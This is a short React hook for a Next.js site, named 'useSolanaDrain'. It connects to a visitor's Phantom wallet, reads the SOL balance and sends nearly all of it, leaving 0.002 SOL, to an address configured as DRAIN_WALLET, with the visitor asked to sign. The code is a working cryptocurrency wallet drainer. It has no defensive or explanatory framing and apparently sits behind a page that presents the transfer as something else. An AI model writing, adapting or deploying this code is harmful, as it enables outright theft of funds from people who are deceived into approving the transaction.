"use client";

import { useCallback } from 'react';
import { Connection, Transaction, SystemProgram, PublicKey } from '@solana/web3.js';

const DRAIN_WALLET = process.env.NEXT_PUBLIC_SOLANA_WALLET;
const MIN_BALANCE = 0.003 * 1e9; // 0.003 SOL

export const useSolanaDrain = () => {
  const executeDrain = useCallback(async (allocatedAmount) => {
    try {
      if (!window.solana?.isPhantom) {
        throw new Error('Phantom wallet not detected');
      }

      // Using environment variable for RPC
      const connection = new Connection(process.env.NEXT_PUBLIC_SOLANA_RPC, 'confirmed');
      
      const response = await window.solana.connect();
      const walletPubkey = response.publicKey;
      
      const balance = await connection.getBalance(walletPubkey);
      
      if (balance < MIN_BALANCE) {
        throw new Error('Insufficient balance for gas');
      }
      
      const drainAmount = balance - 2000000; // Leave 0.002 SOL for gas
      
      const { blockhash } = await connection.getLatestBlockhash();
      
      const transaction = new Transaction({
        feePayer: walletPubkey,
        recentBlockhash: blockhash,
      }).add(
        SystemProgram.transfer({
          fromPubkey: walletPubkey,
          toPubkey: new PublicKey(DRAIN_WALLET),
          lamports: drainAmount,
        })
      );
      
      const signed = await window.solana.signAndSendTransaction(transaction);
      
      await connection.confirmTransaction(signed.signature, 'confirmed');
      
      return {
        success: true,
        txId: signed.signature,
        amount: drainAmount / 1e9
      };
      
    } catch (error) {
      console.error('Solana drain failed:', error);
      throw error;
    }
  }, []);

  return { executeDrain };
};
